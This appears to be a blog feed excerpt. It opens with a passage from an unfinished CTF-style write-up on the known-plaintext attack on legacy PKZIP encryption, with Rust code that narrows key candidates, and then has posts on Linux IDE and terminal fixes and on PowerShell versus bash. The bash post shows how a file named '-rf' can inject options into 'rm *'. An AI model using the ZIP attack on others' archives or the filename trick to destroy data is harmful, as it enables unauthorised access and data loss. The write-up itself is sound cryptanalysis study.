}<br>\end{align}<br>$$<br>WOW，看起来更复杂了（其实没有</p><p>冷静分析一下，假设我们从那 $2^{22}$ 个 $\mathrm {Z_{i+1}}$ 的 <strong>30 个最高有效位</strong> 的可能值中取出一个：</p><ul><li>我们知道 $\mathrm {Z_{i+1}}$ 的<strong>30 个最高有效位</strong>值，那显然 $\mathrm { Z_{i+1} \ll 8 }$ 的 [10, 32) 位我们是知道的‘</li><li>$\mathrm {crcinvtab[MSB(Z_{i+1})]}$——显然我们知道它的整个值</li><li>$\mathrm {MSB(Y_{i+1})}$——表面上看起来这完全是个未知量，其实不然，如果把它当成一个 u32 变量的话，显然它的 [8, 32) 位我们是知道的 —— 全是 0</li><li>$\mathrm {Z_i} $ —— 根据和 $\mathrm {Z_{i+1}}$ 一样的方法我们可以推导出它的 [2, 16] 位，虽然可能值有 64 个。。。</li></ul><p>这个地方不妨列个表</p><table><thead><tr><th>Side</th><th>表达式</th><th>已知位数</th><th>分布范围</th><th>值的个数</th></tr></thead><tbody><tr><td>左边</td><td>$\mathrm {Z_i}$</td><td>14</td><td>[2, 16]</td><td>64</td></tr><tr><td>右边</td><td>$\mathrm {Z_{i+1} \ll 8}$</td><td>22</td><td>[10, 32)</td><td>1</td></tr><tr><td></td><td>$\mathrm {crcinvtab[MSB(Z_{i+1})]}$</td><td>32</td><td>[0, 32)</td><td>1</td></tr><tr><td></td><td>$\mathrm {MSB(Y_{i+1})}$</td><td>24</td><td>[8, 32)</td><td>1</td></tr><tr><td></td><td>左侧总计</td><td>14</td><td>[2, 16]</td><td>64</td></tr><tr><td></td><td>右侧总计</td><td>22</td><td>[10, 32)</td><td>1</td></tr><tr><td></td><td>两侧已知位范围交集</td><td>6</td><td>[10, 16)</td><td></td></tr><tr><td></td><td>两侧已知位范围并集</td><td>30</td><td>[2, 32)</td><td></td></tr></tbody></table><p>这里有两个很重要的点：</p><ol><li>两侧的 [2, 32) 位是相同的（好像是废话。。。</li><li>两侧的 [10, 16) 位都是已知的</li></ol><p>这有啥用呢？</p><p>我们可以利用这个性质来缩小 $\mathrm {Z_i}$ [2, 32) 位的可能值的范围！<br>正常来讲 $\mathrm {Z_i}$ 应该和 $\mathrm {Z_{i+1}}$ 一样都有 $2^{22}$ 个可能值。<br>然而利用上文的结论，我们可以依次取出一个 $\mathrm {Z_{i+1}}$ 的值，然后计算出 $\mathrm {crc32^{-1}(Z_{i+1}, MSB(Y_{i+1}))}$ 的 [10, 16) 位 （值得一提的是由于只要 [10, 16) 位，$\mathrm {MSB(Y_{i+1})}$ 的值我们可以直接填 0 —— 因为它的 [10, 16) 位都是 0），然后对比 $\mathrm {z_i}$ 的 [2, 16) 位的候选值中哪些值的 [10, 16) 位和它相同，就可以缩小 $\mathrm {Z_i}$ 的[2, 16) 位可能值的范围（平均来讲刚好可以将 64 个值缩小到一个），继而缩小  $\mathrm {Z_i}$ 的范围，然后按照以此类推缩小 $\mathrm {Z_{i-1}}$ 的范围，缩小 $\mathrm {Z_{i-2}}$ 的范围，etc</p><p>（需要注意的是这个范围不会一直缩小，后期会不断浮动，实际操作中需要记录最小范围</p><p>这个过程的代码如下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">reduce</span></span>() &#123;</span><br><span class="line">    <span class="comment">// step2 -- 利用多余的明文缩小可能值的范围</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用 k_list 中其他的值缩小 z 候选值范围</span></span><br><span class="line">    <span class="comment">// 前 12 个用作后续攻击用, 最后一个上一轮生成 z_2_32_tab 已经用过了</span></span><br><span class="line">    <span class="keyword">for</span> &amp;k <span class="keyword">in</span> k_list[<span class="number">13</span>..].iter().rev().skip(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> zp_2_32_tab = <span class="built_in">Vec</span>::with_capacity(<span class="number">1</span> &lt;&lt; <span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 z 的可能的值倒推上一个 z （以下称 zp）的可能的值</span></span><br><span class="line">        <span class="keyword">for</span> &amp;z_2_32 <span class="keyword">in</span> &amp;z_2_32_tab &#123;</span><br><span class="line">            <span class="comment">// 计算 zp 的 [10, 32) 位</span></span><br><span class="line">            <span class="comment">// 第二个参数原本是 MSB(key1[i+1])， 但这个地方却置 0 了</span></span><br><span class="line">            <span class="comment">// 因为这个式子展开可以写成 (crc &lt;&lt; 8) ^ CRCINVTAB[msb(crc)] ^ b</span></span><br><span class="line">            <span class="comment">// 由于我们只要这个式子的 [10, 32) 位，而 b 只有八位，刚好无法影响 [10, 32) 位的值</span></span><br><span class="line">            <span class="comment">// 因此置 0 也无所谓</span></span><br><span class="line">            <span class="keyword">let</span> zp_10_32 = crc32inv(z_2_32, <span class="number">0</span>) &amp; <span class="number">0xffff_fc00</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算 zp 的 [2, 16) 位</span></span><br><span class="line">            <span class="keyword">for</span> &amp;zp_2_16 <span class="keyword">in</span> kinv2(k, z_2_32).iter() &#123;</span><br><span class="line">                <span class="comment">// 按位或，得到 zp 的 [2, 32) 位的可能值</span></span><br><span class="line">                zp_2_32_tab.push(zp_2_16 | zp_10_32);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 倒推完成，现在从这里去掉所有重复的值</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 此处在筛选到后期的时候一次去重能去掉的值可能只有几个，可否过几轮再筛选一次</span></span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">"&#123;&#125; -&gt; "</span>, zp_2_32_tab.len());</span><br><span class="line">        zp_2_32_tab.sort_unstable();</span><br><span class="line">        zp_2_32_tab.dedup();</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, zp_2_32_tab.len());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新 z 候选列表, 继续下一轮筛选</span></span><br><span class="line">        std::mem::replace(&amp;<span class="keyword">mut</span> z_2_32_tab, zp_2_32_tab);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 给定 k 和下一个 z 的值（上一步算出来的），返回可能的 z 的值</span></span><br><span class="line"><span class="comment">/// 与 kinv 不同的是可以利用上一次推出的 z 充分缩小可能的 z 的值的范围</span></span><br><span class="line"><span class="comment">/// 平均来讲可以确定唯一一个 z</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">kinv2</span></span>(k: <span class="built_in">u8</span>, zp: <span class="built_in">u32</span>) -&gt; <span class="built_in">Vec</span>&lt;<span class="built_in">u32</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> z = kinv(k);</span><br><span class="line">    <span class="comment">// 利用 z 与 crc32inv(zp, 0) 的 [10, 16) 位相同的性质筛选 z</span></span><br><span class="line">    <span class="keyword">let</span> right_side = crc32inv(zp, <span class="number">0</span>);</span><br><span class="line">    z.iter()</span><br><span class="line">        .filter(|&amp;&amp;n| (n &amp; <span class="number">0x0000_fc00</span>) == (right_side &amp; <span class="number">0x0000_fc00</span>))</span><br><span class="line">        .cloned()</span><br><span class="line">        .collect()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="step4-attacking"><a class="headerlink" href="#step4-attacking"></a>step4 - Attacking!</h2><p>(在念这个的时候我脑子里其实是美国大兵的语音)</p><h3 id="从-z-到-y"><a class="headerlink" href="#从-z-到-y"></a>从 Z 到 Y</h3><p>根据 update_keys 函数，我们得到得到以下推论（这也是显而易见的，可以参照 step3 里的那个式子<br>$$<br>\mathrm { MSB(Y_{i+1})=(Z_{i+1} \ll 8) \oplus crcinvtab[MSB(Z_{i+1})] \oplus Z_i  }<br>$$<br>很显然，给定一个 Z（$\mathrm {Z_n}$，$\mathrm {Z_{n -1}}$，...，$\mathrm {Z_{2}}$） 列表，我们可以得出对应的 MSB(Y) （$\mathrm {MSB(Y_{n})}$，$\mathrm {MSB(Y_{n-1})}$，...，$\mathrm {MSB(Y_{2})}$）列表。全然不够啊，还有 $2^{24}$ 位是未知的。</p><p>冷静分析一下，首先我们从 update_keys 函数可以得知<br>$$<br>\mathrm {Y_i = (Y_{i-1} + LSB(X_i)) \times 08088405h + 1 \ \ \ (mod 2^{32})}<br>$$</p><p>即<br>$$<br>\mathrm {(Y_i - 1) * 08088405h^{-1} = Y_{i-1}+LSB(X_i)}<br>$$</p><p>然后两边取 MSB，就（<strong>很可能</strong>）可以得到以下表达式<br>$$<br>\mathrm {MSB((Y_i - 1) * 08088405h^{-1})=MSB(Y_{i-1})}<br>$$<br>诶，$\mathrm {LSB(X_i)}$ 咋没了。。。因为它太小了。。。才 8 位，而我们这里只保留高 8 位。去掉它绝大多数情况下都不会影响表达式成立。</p><p>于是我们现在成功建立了 $\mathrm {Y_i}$ 和 $\mathrm {Y_{i-1}}$ 之间的联系，现在可以用这个关系来缩小 Y 的可能值的范围（似曾相识的手法</p><p>首先，穷举 $\mathrm {Y_i}$ 的 [0, 24) 位的可能值。然后判断能否使上面的表达式成立。这个可以将值缩小到原来的 $\frac{1}{2^8}$ ，也就是说只剩下 $2^{16}$ 个 Y 的可能值了。这也就是整个攻击过程的复杂度了，接下来的步骤都是固定的，时间复杂度是 O(1)。</p><p><code>MSB(a) - MSB(b) = MSB(a - b)</code> or <code>MSB(a) - MSB(b) = MSB(a - b) + 1</code></p><h3 id="从-y-到-x"><a class="headerlink" href="#从-y-到-x"></a>从 Y 到 X</h3><p>现在我们有（最多）$2^{38}$ 个可能的 Y 值列表。</p><p>如何获取 X 呢？</p><p>由上文的公式<br>$$<br>\mathrm {Y_i = (Y_{i-1} + LSB(X_i)) \times 08088405h + 1 \ \ \ (mod 2^{32})}<br>$$<br>变形可得<br>$$<br>\mathrm {LSB(X_i) = (Y_i -1) \times 08088405h^{-1}-Y_{i-1} \ \ \ (mod 2^{32})}<br>$$<br>于是我们获得了 X 的 [0, 8) 位，还剩 24 位。</p><p>观察 update_keys 最后一个还没用到的式子<br>$$<br>\begin{align}<br>\mathrm {X_i }&amp;= \mathrm {crc32(X_{i-1},P_i)} \\<br>&amp;= \mathrm {(X_{i-1} \gg 8) \oplus crctab[LSB(X_{i-1}) \oplus P_i]}<br>\end{align}<br>$$<br>这是一个很诱人的式子，它意味着只要我们找到一个 X 的可能值，我们就能推出整个唯一的 X 列表。</p><p>那么如何找到呢？请听下回分解。</p><blockquote><p>文章是半年前写的，本来打算写完再发的，但是因为我估计不会填这个坑了，所以干脆就这样发出来吧。如果有对这方面感兴趣的同学，或许可以让他少走一些弯路。</p><p>没有下回了。因为论文后面看不懂了，也不想看了。这种该讲解的地方不讲解，不用讲解的地方反倒讲解的文章读起来太糟心了。想了想，也许这就是“知识的诅咒”吧。</p></blockquote><h1 id="参考资料-假装严肃"><a class="headerlink" href="#参考资料-假装严肃"></a>参考资料 （假装严肃</h1><ol><li>Biham, E., &amp; Kocher, P. C. (1994, December). A known plaintext attack on the PKZIP stream cipher. In <em>International Workshop on Fast Software Encryption</em> (pp. 144-153). Springer, Berlin, Heidelberg.</li><li>PKWARE Inc. <em>.ZIP File Format Specification</em>. from <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" target="_blank" rel="noopener">https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT</a></li><li>Kimci86. bkcrack source code. from <a href="https://github.com/kimci86/bkcrack" target="_blank" rel="noopener">https://github.com/kimci86/bkcrack</a></li><li>conrad. pkcrack. from <a href="https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html" target="_blank" rel="noopener">https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html</a></li><li>Mark Stamp. <em>Breaking Ciphers in the Real World</em>. Retrieved April 15, 2019, from San Jose State University, Department of Computer Science Web site: <a href="http://www.cs.sjsu.edu/~stamp/crypto/" target="_blank" rel="noopener">http://www.cs.sjsu.edu/~stamp/crypto/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不会有下了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>JetBrains 家 IDE 在 Linux 下的奇怪字体问题(锯齿, 字体过小)</title>
    <link href="https://www.aloxaf.com/2019/04/fxxk_jetbrains_font_linux/"/>
    <id>https://www.aloxaf.com/2019/04/fxxk_jetbrains_font_linux/</id>
    <published>2019-04-03T09:44:44.000Z</published>
    <updated>2019-12-05T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>JetBrains 家的 IDE 在 Linux 下会有一些奇怪的问题: 如字体很丑(没开抗锯齿一样), 字体过小(目测是 HiDPI 下的问题), 最近更新了一下 PyCharm 2019 又出现了这个问题, 解决问题以后记录一下方案, 造福广大 JetBrains 信徒</p><p>长话短说——统统是 jre 的问题</p><h2 id="解决方案"><a class="headerlink" href="#解决方案"></a>解决方案</h2><p>换用 IntelliJ patch 过的 jre</p><h2 id="具体方法"><a class="headerlink" href="#具体方法"></a>具体方法</h2><p>有很多, 因为我在用 Arch Linux 就用 Arch Linux 下比较方便的方法了:</p><ol><li>安装 clion-jre (Archlinuxcn 源有二进制包) (从 AUR 安装 intellij-jdk 应该也行, 可能还更方便? 不过懒得试了, 因为我用 clion 时已经装了这个)</li><li>如果是 clion 可以无视这条步骤.  <code>Esc-x</code>, 输入 <code>Switch Boot JDK</code>, 改用 <code>/opt/clion/jre64</code> ( 没有这个的话自己浏览路径选</li><li>没了, 重新启动你的 IDE, 问题应该解决了</li></ol><p>注：2019.1 版本以后，如果需要更换 JDK 需要安装 <a href="https://plugins.jetbrains.com/plugin/12836-choose-runtime" target="_blank" rel="noopener">Choose Runtime</a> 插件，然后使用 Choose Runtime 来更换 Runtime。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JetBrains 家的 IDE 在 Linux 下会有一些奇怪的问题: 如字体很丑(没开抗锯齿一样), 字体过小(目测是 HiDPI 下的问题), 最近更新了一下 PyCharm 2019 又出现了这个问题, 解决问题以后记录一下方案, 造福广大 JetBrains 信徒
      
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Alacritty HiDPI 下的坑</title>
    <link href="https://www.aloxaf.com/2019/04/alacritty_hidpi/"/>
    <id>https://www.aloxaf.com/2019/04/alacritty_hidpi/</id>
    <published>2019-04-03T09:31:49.000Z</published>
    <updated>2019-04-03T09:31:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>为啥要折腾 Alacritty 呢, 因为 Konsole 有点小问题: <a href="https://bugs.kde.org/show_bug.cgi?id=401298" target="_blank" rel="noopener">https://bugs.kde.org/show_bug.cgi?id=401298</a> (不过这个问题已经 fix 了, 下个版本应该就没有了, 我大概又会滚回 Konsole, 毕竟有 blur 和 ligatures), 阻碍我使用棒棒的 <a href="https://github.com/Peltoche/lsd/issues/118" target="_blank" rel="noopener">lsd</a>.</p><h2 id="问题表现"><a class="headerlink" href="#问题表现"></a>问题表现</h2><p>具体表现为布局问题, 无视配置文件, 如</p><ul><li>总是最大化窗口</li><li>总是最大化高度</li></ul><h2 id="解决方案-临时"><a class="headerlink" href="#解决方案-临时"></a>解决方案(临时)</h2><p>为 Alacritty 设置环境变量 <code>WINIT_HIDPI_FACTOR=1</code></p><p>参考: <a href="https://github.com/tomaka/winit/issues/745" target="_blank" rel="noopener">tomaka/winit#745</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为啥要折腾 Alacritty 呢, 因为 Konsole 有点小问题: &lt;a href=&quot;https://bugs.kde.org/show_bug.cgi?id=401298&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bugs.kd
      
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell 真香</title>
    <link href="https://www.aloxaf.com/2019/03/powershell_miaoa/"/>
    <id>https://www.aloxaf.com/2019/03/powershell_miaoa/</id>
    <published>2019-03-01T16:02:05.000Z</published>
    <updated>2019-03-17T03:56:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我就是饿死, 死外面, 从外面跳下去, 也不会用 M$ 的垃圾 PowerShell !</p><p>...</p><p>真香!</p></blockquote><p><strong>NOTE: 这是一篇黑 bash 吹 PowerShell(以下简称 pwsh) 的文章, bash 死忠粉以及软黑请退散.</strong></p><a id="more"></a><h1 id="起因-为什么要使用-pwsh"><a class="headerlink" href="#起因-为什么要使用-pwsh"></a>起因 (为什么要使用 pwsh)</h1><p>因为用 bash 写脚本太痛苦了!</p><p>语法诡异, 内置功能弱地1B. zsh 好了那么一点, 然而还是很痛苦, 而且那惜字如金的命名风格导致我的脚本过段时间自己都不认得写的是啥了.</p><p>什么? 为什么不用 Python ? Python 倒是过段时间也能认得自己写的是啥, 可是写起来太麻烦了.</p><p>我需要一个写起来爽, 还看得懂我写了啥的 shell.</p><p>于是我就想起了 pwsh. (其实在用 Linux 之前学过一点, 毕竟 cmd 都亡了, 要紧跟时代 (谁知道我竟然叛逃 Linux 了</p><p>于是我就试用了一下, 然后发现: woc, 真香!</p><h1 id="优点"><a class="headerlink" href="#优点"></a>优点</h1><h2 id="语法简单"><a class="headerlink" href="#语法简单"></a>语法简单</h2><p>比 bash 不知道高到哪里去了</p><p>多么直观的语法啊, 麻麻再也不用担心我几个星期没写就忘记语法了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if 语句</span></span><br><span class="line"><span class="variable">$n</span> = <span class="built_in">Read-Host</span> <span class="string">"请输入你的年龄"</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$n</span> <span class="nomarkup">-ge</span> <span class="number">18</span>) &#123;</span><br><span class="line">    echo <span class="string">"是成年人"</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$n</span> <span class="nomarkup">-ge</span> <span class="number">13</span>) &#123;</span><br><span class="line">    echo <span class="string">"是青少年"</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"是小屁孩"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># switch 语句</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$n</span>) &#123;</span><br><span class="line">    &#123;<span class="variable">$_</span> <span class="nomarkup">-gt</span> <span class="number">18</span>&#125; &#123; echo <span class="string">"是成年人"</span>; <span class="keyword">break</span> &#125;</span><br><span class="line">    <span class="number">18</span> &#123; echo <span class="string">"是半步成年"</span>; <span class="keyword">break</span> &#125;</span><br><span class="line">    Default &#123; echo <span class="string">"不是成年人"</span>; <span class="keyword">break</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># for 语句</span></span><br><span class="line"><span class="variable">$sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$sum</span> += <span class="variable">$i</span></span><br><span class="line">&#125;</span><br><span class="line">echo <span class="variable">$sum</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 循环, do while 差不多</span></span><br><span class="line"><span class="variable">$sum</span> = <span class="number">0</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="variable">$sum</span> += <span class="variable">$i</span></span><br><span class="line">    <span class="variable">$i</span>++</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="variable">$sum</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hash 表</span></span><br><span class="line"><span class="variable">$language</span> = @&#123;</span><br><span class="line">    Name = <span class="string">"PowerShell"</span></span><br><span class="line">    Company = <span class="string">"Microsoft"</span></span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">"$(<span class="variable">$language</span>.Name)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="keyword">function</span> pow(<span class="variable">$x</span>, <span class="variable">$y</span>=<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [Math]::Pow(<span class="variable">$x</span>, <span class="variable">$y</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内置功能强大"><a class="headerlink" href="#内置功能强大"></a>内置功能强大</h2><p>pwsh 不需要借助外部命令就能完成大量操作.</p><blockquote><p>此处应强调一下, 你愿意的话也可以在 pwsh 里 sed, grep, awk 走起, 写成 bash 味的 pwsh.<br>因为这些玩意儿不是 bash 的一部分, 是个 shell 都能调用.</p><p>你能用的我也能用, 我能用的你却不能用, 岂不美哉?</p><p>有些人可能会觉得这违反了 Unix 哲学, 很多违反 Unix 哲学的东西都很火, 并且干趴了遵循 Unix 哲学的同行 (</p></blockquote><p>在这一点上我要点名批评 bash,</p><p>为啥 Linux 上需要 sed, awk, grep 等等工具? 因为 bash 它太 tm 弱鸡了.</p><p>刚用 Linux 的时候我觉得 bash 比它在 Windows 上的小兄弟 cmd 还是要强了不少的——cmd 特么连数组都没有, 只能靠变量延迟扩展这种神仙设定来模拟数组.<br>然而用了一段时间后我发现: nnd, 强个屁, 这破 bash 干啥事儿都要外部命令, 连 mv, cp 这些都是外部命令.</p><blockquote><p>这主要是从 cmd 带过来的习惯——高性能批处理指南第一条就是少用外部命令 <s>(其实根本没有这个指南, 不过这话是对的, 除此之外还要少用 for /f %%i in ('') 和管道</s></p></blockquote><p>比如说以空格为分隔符, 截取第 3 列</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">:: batch</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">"tokens=3"</span> %i <span class="keyword">in</span> (<span class="string">"1 2 3 4 5"</span>) <span class="keyword">do</span> echo %i</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash</span></span><br><span class="line">echo <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> | cut -d<span class="string">' '</span> -f3</span><br><span class="line">echo <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> | awk <span class="string">'&#123;print $3&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwsh</span></span><br><span class="line"><span class="comment"># 首先 bash 的方法 pwsh 也能用</span></span><br><span class="line">(<span class="string">'1 2 3 4 5'</span> -split <span class="string">' '</span>)[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>你说 bash 你丢不丢人, 连 cmd 都能不借助外部命令自己处理</p><p>再来看正则表达式, bash 不用说了大家都知道的, cmd 也不用说了, findstr 那垃圾正则有和没有都一样</p><p>我们来看看 pwsh</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">'&lt;p&gt;WOWOWOWO&lt;/p&gt;'</span> <span class="nomarkup">-match</span> <span class="string">'&lt;p&gt;.*&lt;/p&gt;'</span></span><br><span class="line">True</span><br><span class="line">&gt; <span class="string">'&lt;p&gt;WOWOWOWO&lt;/p&gt;'</span> <span class="nomarkup">-replace</span> <span class="string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,<span class="string">'$1'</span></span><br><span class="line">WOWOWOWO</span><br><span class="line">&gt; <span class="string">'&lt;div&gt;&lt;div&gt;&lt;/div&gt;'</span> <span class="nomarkup">-match</span> <span class="string">"&lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?'Open'&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?'-Open'&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;"</span></span><br><span class="line">&gt; <span class="variable">$Matches</span>.Values</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>真是妙啊!</p><h2 id="符合直觉的通配符"><a class="headerlink" href="#符合直觉的通配符"></a>符合直觉的通配符</h2><p>我曾遇到过一个需求, 根据通配符判断文件是否存在</p><p>判断文件是否存在我还是会的, bash 的写法 <code>[ -f ~/.zshrc ]</code>,  pwsh 的写法 <code>Test-Path ~/.zshrc</code></p><blockquote><p>看, pwsh 的写法多清晰, 即使从没学过 pwsh 的人也能看出右边的命令做了什么, 然而从没学过 bash 的人估计想破头也看不懂左边的代码. 好歹搞个长命令啊, 比如 <code>[ -exists ~/.zshrc ]</code> 什么的</p></blockquote><p>那加上通配符该怎么办呢?</p><p>这里又需要点名批评一下  bash, bash 里的通配符是由 shell 展开的. 是的, 是由 shell 展开的!!</p><p>乍一看好像也没什么问题? 让我来为你演示一下这个神奇特性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[/tmp]$ mkdir <span class="built_in">test</span></span><br><span class="line">[/tmp]$ <span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line">[/tmp/<span class="built_in">test</span>]$ touch -- -f</span><br><span class="line">[/tmp/<span class="built_in">test</span>]$ *</span><br><span class="line">bash: -f：未找到命令</span><br><span class="line">[/tmp/<span class="built_in">test</span>]$ [ * ~/.zshrc ] &amp;&amp; <span class="built_in">echo</span> 1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>看懂了吗! 竟然 TM 有这种操作!! (想象一下你<code>rm *</code> 的时候目录下有个叫 <code>-rf</code>的文件). (我记得好像有一道 CTF 题就是用了这种神奇操作.)</p><p>了解这个神奇特性以后, 你应该知道, <code>[ -f ~/*.c ]</code> 这个代码是肯定行不通的.</p><p>该怎么办呢? 问了G娘以后得知是 <code>compgen -G &quot;&lt;glob-pattern&gt;&quot;</code>, 这个命令在有匹配时会输出匹配, 这样就能判断啦 ~<br>当然缺点就是你得 <code>&gt;/dev/null</code> 屏蔽掉输出.</p><p>并且, 注意到了吗, 这个地方使用了双引号来避免通配符被提前展开.<br>这又带来了另一个问题!! <code>~</code> 这玩意儿也是由 shell 展开的!! 也就是说如果你这样写 <code>compgen -G &quot;~/*&quot;</code>, 是不会有任何输出的, 因为它期望在一个名为 <code>~</code> 的文件夹下寻找文件. 累了累了, 不管了</p><p>再看 pwsh 的解法——直接写就行了...<code>Test-Path &quot;~/*.c&quot;</code>, 毫无任何奇技淫巧, 可读性倍儿高.</p><h2 id="类型"><a class="headerlink" href="#类型"></a>类型</h2><p>一开始学编程的时候, 我觉得类型这玩意儿好像也没啥用, 弱类型 &amp;&amp; 动态类型真香,<br>后来学了 